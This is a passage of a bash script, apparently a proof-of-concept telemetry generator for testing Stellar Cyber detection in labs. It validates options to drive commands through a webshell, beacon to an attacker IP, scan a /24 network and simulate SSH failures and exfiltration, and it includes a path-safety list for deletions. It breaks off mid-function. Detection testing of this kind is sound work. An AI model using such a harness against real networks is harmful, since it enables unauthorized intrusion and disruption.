#!/usr/bin/env bash
# ==============================================================================
# Stellar Cyber Open XDR / NDR / EDR / SIEM / UEBA PoC Telemetry Generator
# Safe, non-destructive, runtime-dir-only simulation for authorized labs.
# @stellar-poc-version: 1.0.0
# ==============================================================================

# Strict mode: use -E -e -o pipefail; omit -u (nounset) because HAS_* flags are
# set dynamically via declare -g during dependency assessment and many stages
# rely on ${var:-default}. Full 'set -Eeuo pipefail' is not enabled globally.
set -Eeo pipefail

_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STELLAR_POC_VERSION=""

load_stellar_poc_version() {
    STELLAR_POC_VERSION="1.0.0"
    if [[ -f "${_SCRIPT_DIR}/stellar_poc.version" ]]; then
        STELLAR_POC_VERSION="$(tr -d '[:space:]' < "${_SCRIPT_DIR}/stellar_poc.version")"
    fi
    [[ -n "${STELLAR_POC_VERSION}" ]] || STELLAR_POC_VERSION="0.0.0-dev"
}

read_companion_script_version() {
    local file="$1"
    grep -m1 '^# @stellar-poc-version:' "${file}" 2>/dev/null | awk '{print $3}'
}

validate_companion_script_versions() {
    local f expected="${STELLAR_POC_VERSION}" found mismatched=()
    for f in stellar_poc_humanize.sh stellar_poc_followup.sh; do
        found=$(read_companion_script_version "${_SCRIPT_DIR}/${f}")
        if [[ "${found}" != "${expected}" ]]; then
            mismatched+=("${f}=${found:-missing}")
        fi
    done
    if ((${#mismatched[@]} > 0)); then
        echo "ERROR: Stellar PoC script bundle version mismatch (expected ${expected}):" >&2
        printf '  %s\n' "${mismatched[@]}" >&2
        echo "Update @stellar-poc-version in all stellar_poc*.sh and stellar_poc.version together." >&2
        exit 1
    fi
}

show_stellar_poc_version() {
    local git_rev="" git_dirty=""
    if git_rev=$(git -C "${_SCRIPT_DIR}" rev-parse --short HEAD 2>/dev/null); then
        if [[ -n "$(git -C "${_SCRIPT_DIR}" status --porcelain -- stellar_poc.sh stellar_poc_humanize.sh stellar_poc_followup.sh stellar_poc.version 2>/dev/null)" ]]; then
            git_dirty="-dirty"
        fi
        git_rev=" commit=${git_rev}${git_dirty}"
    fi
    cat <<EOF
stellar-poc ${STELLAR_POC_VERSION}
  stellar_poc.sh
  stellar_poc_humanize.sh
  stellar_poc_followup.sh
  stellar_poc.version${git_rev}
EOF
}

load_stellar_poc_version

source_companion_scripts_or_exit() {
    local missing=() f
    for f in stellar_poc_humanize.sh stellar_poc_followup.sh; do
        [[ -f "${_SCRIPT_DIR}/${f}" ]] || missing+=("${_SCRIPT_DIR}/${f}")
    done
    if ((${#missing[@]} > 0)); then
        echo "ERROR: Required companion file(s) missing:" >&2
        printf '  %s\n' "${missing[@]}" >&2
        echo "Run:" >&2
        echo "  ls -l ${_SCRIPT_DIR}/stellar_poc*.sh" >&2
        exit 1
    fi
}
source_companion_scripts_or_exit
validate_companion_script_versions
# shellcheck source=stellar_poc_humanize.sh
source "${_SCRIPT_DIR}/stellar_poc_humanize.sh"
# shellcheck source=stellar_poc_followup.sh
source "${_SCRIPT_DIR}/stellar_poc_followup.sh"

# --- Shared logical config (operator + remote) ---
RUNTIME_DIR="/tmp/.poc_runtime_${USER:-unknown}"   # remote webshell runtime path (config/default)
RUNTIME_BASE_DIR=""

# --- Remote webshell-only paths (never local report/log paths) ---
REMOTE_RUNTIME_DIR=""
REMOTE_STAGING_DIR=""
REMOTE_FAKE_DIR=""
REMOTE_STATE_DIR=""
REMOTE_LOG_DIR=""

# --- Local operator-only paths ---
LOCAL_STATE_DIR=""
LOG_DIR=""                      # operator-visible logs under EFFECTIVE_REPORT_DIR/logs
REPORT_DIR=""
REPORT_BASE_DIR=""
EFFECTIVE_REPORT_DIR=""
LOG_FILE=""                     # local operator log
TIMELINE_LOG=""                 # local timeline log
MITRE_CSV=""
REPORT_MD=""
SUMMARY_TXT=""
CUSTOMER_SUMMARY_TXT=""

WEB_SHELL_URL=""
WEBSHELL_METHOD="GET"
ATTACKER_IP=""
ATTACKER_PORT=8000
TARGET_NET=""
NETWORK_PREFIX=""
ATTACKER_BASE_URL=""

MODE="balanced"             # quick|balanced|full
PROFILE="normal"            # stealth|normal|aggressive
DRY_RUN=false
SINGLE_STAGE=""
KEEP_ARTIFACTS=false
VERBOSE=false
CAMPAIGN_ID=""

CALLBACK_PREFIX="/api/v1"
BEACON_COUNT=10
DNS_QUERY_COUNT=80
CYCLE_SLEEP_MIN=3
CYCLE_SLEEP_MAX=8
PING_SWEEP_PARALLELISM=24
FALLBACK_SCAN_PARALLELISM=32
SSH_FAIL_COUNT=20
HTTP_SCAN_REPEAT=8
MAX_TARGETS=24
AUTO_OVERLAP=false
OVERLAP_PIDS=()
LOCAL_HAS_CURL=false
LOCAL_XARGS_PARALLEL_SUPPORTED=false
REMOTE_XARGS_PARALLEL_SUPPORTED=false
REMOTE_WRAP_READY=false
REMOTE_SHELL_BIN="sh"
OVERLAP_BEACON_STARTED=false
OVERLAP_DNS_STARTED=false
CUSTOM_RUNTIME_DIR=""
SECURE_RUNTIME=false
CLEANUP_RUNTIME_ON_EXIT=false
RUNTIME_EPHEMERAL=false
RUNTIME_MODE="default-user"
RUNTIME_FALLBACK_USED=false
RUNTIME_OWNERSHIP_ISSUE=false
RUNTIME_DIAGNOSTIC=""
REPORT_PRESERVED=true
REPORT_COPY_PERFORMED=false
CLEANUP_DONE=false
STOP_REQUESTED=false
WEBSHELL_LOCK_FILE=""
WEBSHELL_SLOW=false
WEBSHELL_CMD_STYLE="raw"
WEBSHELL_LAST_HTTP_CODE=""
PAYLOAD_WARN_BYTES=4000
PAYLOAD_MAX_BYTES=16000
RUNTIME_PATH_SAFETY_REASON=""

# --- Pipeline repetition (operator schedule) ---
REPEAT_COUNT=0
DURATION_MINUTES=0
PIPELINE_CYCLE_SLEEP=30
POC_INTENSITY="normal"
DEFAULT_DURATION_MINUTES=10
TOTAL_CYCLES_COMPLETED=0
CURRENT_CYCLE=0
CLI_BEACON_COUNT=""
CLI_DNS_QUERY_COUNT=""
CLI_HTTP_REPEAT=""
CLI_SSH_FAIL_COUNT=""

RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

log_message() {
    local level="$1"
    local msg="$2"
    local ts
    ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    [[ -n "${LOG_FILE}" ]] && echo "[$ts] [$level] $msg" >> "${LOG_FILE}"
    case "$level" in
        ERROR) echo -e "${RED}[-] ERROR: ${msg}${NC}" ;;
        WARN)  echo -e "${YELLOW}[!] WARN:  ${msg}${NC}" ;;
        STAGE) echo -e "${CYAN}${BOLD}[*] STAGE: ${msg}${NC}" ;;
        OK)    echo -e "${GREEN}[+] ${msg}${NC}" ;;
        *)     echo "[.] ${msg}" ;;
    esac
}

vlog() {
    if [[ "${VERBOSE}" == true ]]; then
        echo "[VERBOSE] $*"
    fi
}

# Safe line counting — never use "grep -c ... || echo 0" (produces "0\n0").
safe_count_lines() {
    awk 'NF{c++} END{print c+0}'
}

safe_int() {
    local v="$1"
    printf '%s\n' "${v}" | awk '/^[0-9]+$/ {print; found=1; exit} END{if (!found) print 0}'
}

pipeline_stop_requested() {
    [[ "${STOP_REQUESTED}" == true ]]
}

request_pipeline_stop() {
    STOP_REQUESTED=true
}

interruptible_sleep() {
    local total="${1:-1}" elapsed=0 chunk=1
    [[ "${total}" =~ ^[0-9]+$ ]] || total=1
    while (( elapsed < total )); do
        pipeline_stop_requested && return 130
        if (( total - elapsed < chunk )); then
            chunk=$((total - elapsed))
        fi
        sleep "${chunk}" 2>/dev/null || sleep 1
        elapsed=$((elapsed + chunk))
    done
    return 0
}

on_pipeline_signal() {
    request_pipeline_stop
    log_message "WARN" "Stop requested — cleaning up background workers"
    cleanup_background_jobs
    exit 130
}

on_pipeline_err() {
    local ec=$?
    request_pipeline_stop
    cleanup_background_jobs
    exit "${ec:-2}"
}

webshell_init_lock() {
    WEBSHELL_LOCK_FILE="${LOCAL_STATE_DIR}/.webshell.lock"
    mkdir -p "${LOCAL_STATE_DIR}" 2>/dev/null || true
    : > "${WEBSHELL_LOCK_FILE}" 2>/dev/null || WEBSHELL_LOCK_FILE="/tmp/.stellar_poc_webshell_${USER:-unknown}.lock"
    touch "${WEBSHELL_LOCK_FILE}" 2>/dev/null || true
}

webshell_with_lock() {
    local rc=0
    if [[ -n "${WEBSHELL_LOCK_FILE}" && -e "${WEBSHELL_LOCK_FILE}" ]] && command -v flock >/dev/null 2>&1; then
        ( flock -w 120 9 || exit 124; "$@" ) 9>"${WEBSHELL_LOCK_FILE}" || rc=$?
    else
        "$@" || rc=$?
    fi
    if (( rc == 124 )); then
        log_message "WARN" "Webshell lock timeout (120s) — remote shell may be saturated"
        add_fallback_usage "Webshell lock timeout — consider --verbose and check webshell responsiveness"
    fi
    return "${rc}"
}

show_usage_menu() {
    cat <<EOF
Usage: $0 --webshell URL --attacker-ip IP --target-net CIDR [options]

Authorized lab / PoC only. Targets must stay inside --target-net.

Required:
  --webshell URL              Webshell endpoint (GET/POST command channel)
  --attacker-ip IP            Callback / listener IP for beacon simulation
  --target-net CIDR           Lab network to scan (only /24 supported)

Optional:
  --version                   Print script bundle version and exit
  --intensity LEVEL           Telemetry strength: light | normal | high | spike
                              [default: normal]
  --duration-minutes N        How long to run pipeline cycles [default: 10]
  --attacker-port PORT        Callback HTTP port [default: 8000]
  --dry-run                   Print plan and reports without remote execution
  --verbose                   Extra operator logging

Intensity guide:
  light   — quick functional test (minimal follow-up)
  normal  — realistic PoC with beacon + overlap + service follow-ups
  high    — strong XDR/NDR/SIEM telemetry (aggressive follow-up bursts)
  spike   — ML/anomaly threshold burst (1000+ HTTP/SSH/DNS events per host)

Examples:
  $0 --webshell http://10.0.0.5/shell.jsp --attacker-ip 10.0.0.99 --target-net 10.0.0.0/24
  $0 ... --intensity high --duration-minutes 15
  $0 ... --intensity spike --duration-minutes 5 --verbose
EOF
}

parse_cli_switches() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --webshell) WEB_SHELL_URL="${2:-}"; shift 2 ;;
            --attacker-ip) ATTACKER_IP="${2:-}"; shift 2 ;;
            --attacker-port) ATTACKER_PORT="${2:-}"; shift 2 ;;
            --target-net) TARGET_NET="${2:-}"; shift 2 ;;
            --intensity) POC_INTENSITY="${2:-}"; shift 2 ;;
            --duration-minutes) DURATION_MINUTES="${2:-}"; shift 2 ;;
            --dry-run) DRY_RUN=true; shift ;;
            --verbose) VERBOSE=true; shift ;;
            --version|-V) show_stellar_poc_version; exit 0 ;;
            --help|-h|--h|-?) show_usage_menu; exit 0 ;;
            --webshell-method) vlog "internal: --webshell-method"; WEBSHELL_METHOD="${2:-}"; shift 2 ;;
            --mode) vlog "internal: --mode"; MODE="${2:-}"; shift 2 ;;
            --profile) vlog "internal: --profile"; PROFILE="${2:-}"; shift 2 ;;
            --repeat-count) vlog "internal: --repeat-count"; REPEAT_COUNT="${2:-}"; shift 2 ;;
            --cycle-sleep) vlog "internal: --cycle-sleep"; PIPELINE_CYCLE_SLEEP="${2:-}"; shift 2 ;;
            --single-stage) vlog "internal: --single-stage"; SINGLE_STAGE="${2:-}"; shift 2 ;;
            --report-dir) vlog "internal: --report-dir"; REPORT_DIR="${2:-}"; shift 2 ;;
            --runtime-dir) vlog "internal: --runtime-dir"; CUSTOM_RUNTIME_DIR="${2:-}"; shift 2 ;;
            --secure-runtime) vlog "internal: --secure-runtime"; SECURE_RUNTIME=true; shift ;;
            --keep-artifacts) vlog "internal: --keep-artifacts"; KEEP_ARTIFACTS=true; shift ;;
            *) log_message "ERROR" "Unknown option: $1 (see --help)"; exit 1 ;;
        esac
    done
}

validate_ipv4_octet() {
    local ip="$1"
    local name="$2"
    local a b c d
    IFS='.' read -r a b c d <<< "${ip}"
    for octet in "$a" "$b" "$c" "$d"; do
        if [[ -z "${octet}" ]] || ! [[ "${octet}" =~ ^[0-9]+$ ]] || (( 10#${octet} < 0 || 10#${octet} > 255 )); then
            log_message "ERROR" "${name} invalid: ${ip}"
            exit 1
        fi
    done
}

validate_inputs() {
    [[ -z "${WEB_SHELL_URL}" ]] && { log_message "ERROR" "--webshell is required"; exit 1; }
    [[ -z "${ATTACKER_IP}" ]] && { log_message "ERROR" "--attacker-ip is required"; exit 1; }
    [[ -z "${TARGET_NET}" ]] && { log_message "ERROR" "--target-net is required"; exit 1; }
    [[ "${WEBSHELL_METHOD}" =~ ^(GET|POST)$ ]] || { log_message "ERROR" "--webshell-method GET|POST"; exit 1; }
    [[ "${MODE}" =~ ^(quick|balanced|full)$ ]] || { log_message "ERROR" "--mode quick|balanced|full"; exit 1; }
    [[ "${PROFILE}" =~ ^(stealth|normal|aggressive)$ ]] || { log_message "ERROR" "--profile stealth|normal|aggressive"; exit 1; }
    [[ "${ATTACKER_IP}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || { log_message "ERROR" "Invalid --attacker-ip"; exit 1; }
    validate_ipv4_octet "${ATTACKER_IP}" "attacker-ip"

    [[ "${TARGET_NET}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]{1,2})$ ]] || { log_message "ERROR" "Invalid --target-net"; exit 1; }
    local base_ip cidr
    base_ip="${TARGET_NET%/*}"
    cidr="${TARGET_NET#*/}"
    validate_ipv4_octet "${base_ip}" "target-net base"
    (( cidr == 24 )) || { log_message "ERROR" "Only /24 target-net supported"; exit 1; }

    [[ "${ATTACKER_PORT}" =~ ^[0-9]+$ ]] || { log_message "ERROR" "--attacker-port must be numeric"; exit 1; }
    if (( ATTACKER_PORT < 1 || ATTACKER_PORT > 65535 )); then
        log_message "ERROR" "--attacker-port out of range (1..65535)"
        exit 1
    fi
    if (( ATTACKER_PORT == 8699 )); then
        log_message "ERROR" "port 8699 is blocked"
        exit 1
    fi

    NETWORK_PREFIX=$(echo "${base_ip}" | awk -F. '{print $1"."$2"."$3}')
    ATTACKER_BASE_URL="http://${ATTACKER_IP}:${ATTACKER_PORT}"

    [[ -z "${POC_INTENSITY}" ]] && POC_INTENSITY="normal"
    if [[ -z "${SINGLE_STAGE}" ]]; then
        if [[ ! "${REPEAT_COUNT}" =~ ^[0-9]+$ || "${REPEAT_COUNT}" -lt 1 ]]; then
            if [[ ! "${DURATION_MINUTES}" =~ ^[0-9]+$ || "${DURATION_MINUTES}" -lt 1 ]]; then
                DURATION_MINUTES="${DEFAULT_DURATION_MINUTES:-10}"
            fi
        fi
    fi

    validate_execution_schedule_options
    validate_humanize_options
    validate_followup_options

    if ! command -v curl >/dev/null 2>&1; then
        log_message "ERROR" "Local curl binary required for webshell communication."
        echo "Install curl: apt-get install -y curl | apk add --no-cache curl | dnf install -y curl"
        exit 1
    fi
    LOCAL_HAS_CURL=true
}

apply_profile_defaults() {
    case "${PROFILE}" in
        stealth) BEACON_COUNT=5; DNS_QUERY_COUNT=20; CYCLE_SLEEP_MIN=8; CYCLE_SLEEP_MAX=18; PING_SWEEP_PARALLELISM=8; FALLBACK_SCAN_PARALLELISM=16; SSH_FAIL_COUNT=8; HTTP_SCAN_REPEAT=4 ;;
        normal) BEACON_COUNT=10; DNS_QUERY_COUNT=80; CYCLE_SLEEP_MIN=3; CYCLE_SLEEP_MAX=8; PING_SWEEP_PARALLELISM=24; FALLBACK_SCAN_PARALLELISM=32; SSH_FAIL_COUNT=20; HTTP_SCAN_REPEAT=8 ;;
        aggressive) BEACON_COUNT=20; DNS_QUERY_COUNT=200; CYCLE_SLEEP_MIN=1; CYCLE_SLEEP_MAX=3; PING_SWEEP_PARALLELISM=64; FALLBACK_SCAN_PARALLELISM=48; SSH_FAIL_COUNT=40; HTTP_SCAN_REPEAT=16 ;;
    esac
}

apply_cli_telemetry_overrides() {
  if [[ -n "${CLI_BEACON_COUNT}" ]]; then
    BEACON_COUNT="${CLI_BEACON_COUNT}"
  fi
  if [[ -n "${CLI_DNS_QUERY_COUNT}" ]]; then
    DNS_QUERY_COUNT="${CLI_DNS_QUERY_COUNT}"
  fi
  if [[ -n "${CLI_HTTP_REPEAT}" ]]; then
    HTTP_SCAN_REPEAT="${CLI_HTTP_REPEAT}"
  fi
  if [[ -n "${CLI_SSH_FAIL_COUNT}" ]]; then
    SSH_FAIL_COUNT="${CLI_SSH_FAIL_COUNT}"
  fi
}

_validate_positive_int() {
  local name="$1" value="$2" min="${3:-1}" max="${4:-999999}"
  [[ "${value}" =~ ^[0-9]+$ ]] || { log_message "ERROR" "${name} must be a positive integer (got: ${value})"; exit 1; }
  if (( 10#${value} < min || 10#${value} > max )); then
    log_message "ERROR" "${name} out of range (${min}..${max}): ${value}"
    exit 1
  fi
}

validate_execution_schedule_options() {
  local repeat_set=0 duration_set=0
  if [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]]; then
    repeat_set=1
  fi
  if [[ "${DURATION_MINUTES}" =~ ^[0-9]+$ && "${DURATION_MINUTES}" -gt 0 ]]; then
    duration_set=1
  fi

  if (( repeat_set == 1 && duration_set == 1 )); then
    log_message "ERROR" "Use only one of --repeat-count or --duration-minutes (not both)"
    exit 1
  fi
  if (( repeat_set == 1 )); then
    _validate_positive_int "--repeat-count" "${REPEAT_COUNT}" 1 10000
  elif [[ -n "${REPEAT_COUNT}" && "${REPEAT_COUNT}" != "0" ]]; then
    log_message "ERROR" "--repeat-count must be >= 1 when specified"
    exit 1
  fi
  if (( duration_set == 1 )); then
    _validate_positive_int "--duration-minutes" "${DURATION_MINUTES}" 1 10080
  elif [[ -n "${DURATION_MINUTES}" && "${DURATION_MINUTES}" != "0" ]]; then
    log_message "ERROR" "--duration-minutes must be >= 1 when specified"
    exit 1
  fi
  _validate_positive_int "--cycle-sleep" "${PIPELINE_CYCLE_SLEEP}" 0 86400

  if [[ -n "${SINGLE_STAGE}" ]] && (( repeat_set == 1 || duration_set == 1 )); then
    log_message "ERROR" "--single-stage cannot be combined with --repeat-count or --duration-minutes"
    exit 1
  fi

  if [[ -n "${CLI_BEACON_COUNT}" ]]; then
    _validate_positive_int "--beacon-count" "${CLI_BEACON_COUNT}" 1 1000
  fi
  if [[ -n "${CLI_DNS_QUERY_COUNT}" ]]; then
    _validate_positive_int "--dns-query-count" "${CLI_DNS_QUERY_COUNT}" 1 10000
  fi
  if [[ -n "${CLI_HTTP_REPEAT}" ]]; then
    _validate_positive_int "--http-repeat" "${CLI_HTTP_REPEAT}" 1 500
  fi
  if [[ -n "${CLI_SSH_FAIL_COUNT}" ]]; then
    _validate_positive_int "--ssh-fail-count" "${CLI_SSH_FAIL_COUNT}" 1 500
  fi
}

pipeline_schedule_description() {
  if [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]]; then
    printf 'repeat-count=%s (cycle-sleep=%ss)' "${REPEAT_COUNT}" "${PIPELINE_CYCLE_SLEEP}"
  elif [[ "${DURATION_MINUTES}" =~ ^[0-9]+$ && "${DURATION_MINUTES}" -gt 0 ]]; then
    printf 'duration-minutes=%s (cycle-sleep=%ss)' "${DURATION_MINUTES}" "${PIPELINE_CYCLE_SLEEP}"
  else
    printf 'single-run'
  fi
}

setup_environment() {
    refresh_runtime_paths
    [[ -z "${CAMPAIGN_ID}" ]] && CAMPAIGN_ID="stellar-poc-$(date +%Y%m%d%H%M%S)-${RANDOM}"
    resolve_report_dirs
    LOCAL_STATE_DIR="${EFFECTIVE_REPORT_DIR}/.operator_state"

    # Local operator dirs only — never mkdir remote webshell paths on the operator host.
    mkdir -p "${EFFECTIVE_REPORT_DIR}" "${LOG_DIR}" "${LOCAL_STATE_DIR}" 2>/dev/null || true
    if [[ ! -d "${LOCAL_STATE_DIR}" || ! -w "${LOCAL_STATE_DIR}" ]]; then
        log_message "ERROR" "setup_environment failed: local operator state dir not writable: ${LOCAL_STATE_DIR}"
        exit 1
    fi
    if [[ ! -d "${EFFECTIVE_REPORT_DIR}" || ! -w "${EFFECTIVE_REPORT_DIR}" || ! -d "${LOG_DIR}" || ! -w "${LOG_DIR}" ]]; then
        log_message "ERROR" "setup_environment failed: report/log directory not writable: ${EFFECTIVE_REPORT_DIR}"
        exit 1
    fi

    LOG_FILE="${LOG_DIR}/operator-${CAMPAIGN_ID}.log"
    TIMELINE_LOG="${LOG_DIR}/timeline-${CAMPAIGN_ID}.log"
    : > "${LOG_FILE}" 2>/dev/null || true
    : > "${TIMELINE_LOG}" 2>/dev/null || true
    MITRE_CSV="${REPORT_DIR}/mitre_mapping-${CAMPAIGN_ID}.csv"
    REPORT_MD="${REPORT_DIR}/attack_chain_report-${CAMPAIGN_ID}.md"
    SUMMARY_TXT="${REPORT_DIR}/summary-${CAMPAIGN_ID}.txt"
    CUSTOMER_SUMMARY_TXT="${REPORT_DIR}/customer_summary-${CAMPAIGN_ID}.txt"
    export LOCAL_STATE_DIR EFFECTIVE_REPORT_DIR LOG_DIR CAMPAIGN_ID TARGET_NET NETWORK_PREFIX
    export REMOTE_RUNTIME_DIR WEB_SHELL_URL ATTACKER_BASE_URL WEBSHELL_METHOD

    : > "${LOCAL_STATE_DIR}/executed_stages.log"
    : > "${LOCAL_STATE_DIR}/skipped_stages.log"
    : > "${LOCAL_STATE_DIR}/fallback_usage.log"
    : > "${LOCAL_STATE_DIR}/dependency_status.log"
    : > "${LOCAL_STATE_DIR}/preflight_results.log"
    : > "${LOCAL_STATE_DIR}/beacon_count.log"
    : > "${LOCAL_STATE_DIR}/exfil_count.log"
    : > "${LOCAL_STATE_DIR}/beacon_attempt_count.log"
    : > "${LOCAL_STATE_DIR}/beacon_success_count.log"
    : > "${LOCAL_STATE_DIR}/exfil_attempt_count.log"
    : > "${LOCAL_STATE_DIR}/exfil_success_count.log"
    : > "${LOCAL_STATE_DIR}/stage_results.log"
    : > "${LOCAL_STATE_DIR}/discovery_probe.log" 2>/dev/null || true
    mkdir -p "${LOCAL_STATE_DIR}/remote_hosts" 2>/dev/null || true
    webshell_init_lock
}

atomic_append_file() {
    local path="$1"
    local line="$2"
    local dir lock_file
    [[ -n "${path}" ]] || return 0
    dir=$(dirname "${path}")
    safe_mkdir_p "${dir}"
    lock_file="${path}.lock"
    if command -v flock >/dev/null 2>&1; then
        {
            flock -x 200
            printf '%s\n' "${line}" >> "${path}"
        } 200>"${lock_file}" 2>/dev/null || printf '%s\n' "${line}" >> "${path}" 2>/dev/null || true
    else
        printf '%s\n' "${line}" >> "${path}" 2>/dev/null || true
    fi
}

state_append() {
    local file="$1"
    local msg="$2"
    [[ -d "${LOCAL_STATE_DIR}" ]] || return 0
    atomic_append_file "${LOCAL_STATE_DIR}/${file}" "${msg}"
}

safe_mkdir_p() {
    local dir
    for dir in "$@"; do
        if [[ -n "${dir}" ]]; then
            mkdir -p "${dir}" 2>/dev/null || true
        fi
    done
}

safe_append_file() {
    atomic_append_file "$1" "$2"
}

safe_write_file() {
    local path="$1"
    local content="${2:-}"
    local dir
    dir=$(dirname "${path}")
    safe_mkdir_p "${dir}"
    printf '%s' "${content}" > "${path}" 2>/dev/null || {
        log_message "WARN" "Failed to write ${path}"
        return 1
    }
}

refresh_remote_paths() {
    REMOTE_RUNTIME_DIR="${RUNTIME_DIR}"
    REMOTE_STAGING_DIR="${REMOTE_RUNTIME_DIR}/stage"
    REMOTE_FAKE_DIR="${REMOTE_RUNTIME_DIR}/fake"
    REMOTE_STATE_DIR="${REMOTE_RUNTIME_DIR}/state"
    REMOTE_LOG_DIR="${REMOTE_RUNTIME_DIR}/logs"
    return 0
}

refresh_runtime_paths() {
    RUNTIME_BASE_DIR="${RUNTIME_DIR}"
    refresh_remote_paths
    return 0
}

validate_remote_command_isolation() {
    local cmd="$1"
    local -a forbidden=()
    [[ -n "${LOG_DIR}" ]] && forbidden+=("${LOG_DIR}")
    [[ -n "${LOG_FILE}" ]] && forbidden+=("${LOG_FILE}")
    [[ -n "${TIMELINE_LOG}" ]] && forbidden+=("${TIMELINE_LOG}")
    [[ -n "${EFFECTIVE_REPORT_DIR}" ]] && forbidden+=("${EFFECTIVE_REPORT_DIR}")
    [[ -n "${REPORT_DIR}" && "${REPORT_DIR}" != "${EFFECTIVE_REPORT_DIR}" ]] && forbidden+=("${REPORT_DIR}")
    [[ -n "${REPORT_MD}" ]] && forbidden+=("${REPORT_MD}")
    [[ -n "${SUMMARY_TXT}" ]] && forbidden+=("${SUMMARY_TXT}")
    [[ -n "${CUSTOMER_SUMMARY_TXT}" ]] && forbidden+=("${CUSTOMER_SUMMARY_TXT}")
    [[ -n "${MITRE_CSV}" ]] && forbidden+=("${MITRE_CSV}")
    [[ -n "${LOCAL_STATE_DIR}" ]] && forbidden+=("${LOCAL_STATE_DIR}")
    local p
    for p in "${forbidden[@]}"; do
        if [[ "${cmd}" == *"${p}"* ]]; then
            log_message "ERROR" "Remote webshell command references local-only path: ${p}"
            return 1
        fi
    done
    return 0
}

format_path_isolation_block() {
    cat <<EOF
Path Isolation (Local Operator vs Remote Webshell)
--------------------------------------------------
Local Operator Paths:
- EFFECTIVE_REPORT_DIR : ${EFFECTIVE_REPORT_DIR}
- LOCAL_STATE_DIR      : ${LOCAL_STATE_DIR}
- LOG_DIR              : ${LOG_DIR}
- REPORT_MD            : ${REPORT_MD}
- SUMMARY_TXT          : ${SUMMARY_TXT}
- CUSTOMER_SUMMARY_TXT : ${CUSTOMER_SUMMARY_TXT}
- TIMELINE_LOG         : ${TIMELINE_LOG}

Remote Webshell Paths:
- REMOTE_RUNTIME_DIR   : ${REMOTE_RUNTIME_DIR}
- REMOTE_STAGING_DIR   : ${REMOTE_STAGING_DIR}
- REMOTE_FAKE_DIR      : ${REMOTE_FAKE_DIR}
- REMOTE_STATE_DIR     : ${REMOTE_STATE_DIR}
- REMOTE_LOG_DIR       : ${REMOTE_LOG_DIR}

Shared Logical Config:
- CAMPAIGN_ID          : ${CAMPAIGN_ID}
- TARGET_NET           : ${TARGET_NET}
- ATTACKER_IP          : ${ATTACKER_IP}
EOF
}

report_path_is_under_runtime() {
    local p="$1"
    [[ -n "${p}" && -n "${REMOTE_RUNTIME_DIR}" ]] || return 1
    case "${p}/" in
        "${REMOTE_RUNTIME_DIR}/"*) return 0 ;;
        *) return 1 ;;
    esac
}

normalize_remote_runtime_path() {
    local in="$1"
    [[ -n "${in}" ]] || return 1
    if [[ "${in}" == /* ]]; then
        printf '%s' "${in}"
    else
        # Remote-relative (webshell cwd); never prefix operator PWD.
        printf '%s' "${in}"
    fi
}

_count_path_segments() {
    local path="$1" stripped depth
    stripped="${path%/}"
    stripped="${stripped#./}"
    if [[ "${stripped}" == /* ]]; then
        stripped="${stripped#/}"
    fi
    if [[ -z "${stripped}" ]]; then
        echo 0
        return 0
    fi
    local IFS='/'
    local -a segs=()
    read -ra segs <<< "${stripped}"
    depth=${#segs[@]}
    echo "${depth}"
}

path_is_safe_for_remote_deletion() {
    local path="$1"
    local depth top leaf
    RUNTIME_PATH_SAFETY_REASON=""

    if [[ -z "${path}" ]]; then
        RUNTIME_PATH_SAFETY_REASON="empty path"
        return 1
    fi
    if [[ "${path}" =~ [[:cntrl:]] ]] || [[ "${path}" =~ [[:space:]] ]]; then
        RUNTIME_PATH_SAFETY_REASON="whitespace or control characters"
        return 1
    fi
    if [[ "${path}" == *"*"* || "${path}" == *"?"* || "${path}" == *"["* ]]; then
        RUNTIME_PATH_SAFETY_REASON="wildcard characters"
        return 1
    fi
    local -a forbidden_exact=(
        "/" "/tmp" "/var" "/home" "/root" "/etc" "/usr" "/var/log"
        "/bin" "/sbin" "/lib" "/lib64" "/opt" "/srv" "/proc" "/sys" "/dev"
    )
    local f
    for f in "${forbidden_exact[@]}"; do
        if [[ "${path}" == "${f}" ]]; then
            RUNTIME_PATH_SAFETY_REASON="forbidden system directory (${f})"
            return 1
        fi
    done
    if [[ "${path}" == */ ]]; then
        RUNTIME_PATH_SAFETY_REASON="trailing slash"
        return 1
    fi
    if [[ "${path}" == "." || "${path}" == ".." ]]; then
        RUNTIME_PATH_SAFETY_REASON="path is . or .."
        return 1
    fi
    if [[ "${path}" =~ (^|/)\.\.(/|$) || "${path}" == ../* || "${path}" == */.. ]]; then
        RUNTIME_PATH_SAFETY_REASON="parent directory reference (..)"
        return 1
    fi

    depth=$(_count_path_segments "${path}")
    if [[ "${path}" == /* ]]; then
        if (( depth < 2 )); then
            RUNTIME_PATH_SAFETY_REASON="absolute path too shallow (need >=2 segments, e.g. /tmp/.poc_runtime_lab)"
            return 1
        fi
        case "${path}" in
            /tmp/.poc_runtime_*|/tmp/.stellar_poc_*|/tmp/.poc_*|/tmp/.stellar_*)
                return 0 ;;
        esac
        local IFS='/'
        local -a parts=()
        read -ra parts <<< "${path#/}"
        top="/${parts[0]}"
        case "${top}" in
            /tmp)
                RUNTIME_PATH_SAFETY_REASON="/tmp requires dedicated .poc_runtime_* or .stellar_poc_* prefix"
                return 1 ;;
            /var|/home|/root|/etc|/usr|/opt|/srv|/bin|/sbin|/lib|/lib64)
                if (( depth < 3 )); then
                    RUNTIME_PATH_SAFETY_REASON="path under ${top} must be at least 3 segments deep for custom runtime"
                    return 1
                fi
                ;;
        esac
        return 0
    fi

    # Remote-relative paths (webshell cwd)
    if (( depth < 1 )); then
        RUNTIME_PATH_SAFETY_REASON="relative path has no segments"
        return 1
    fi
    return 0
}

validate_remote_runtime_path_safety() {
    local path="$1"
    if ! path_is_safe_for_remote_deletion "${path}"; then
        log_message "ERROR" "Remote runtime path rejected (${RUNTIME_PATH_SAFETY_REASON}): ${path}"
        log_message "ERROR" "Use a dedicated path such as /tmp/.poc_runtime_<user>, /tmp/.stellar_poc_<id>, or ./runtime-lab (not /, /tmp, /var, /home, etc.)."
        exit 1
    fi
}

assign_remote_runtime_dir() {
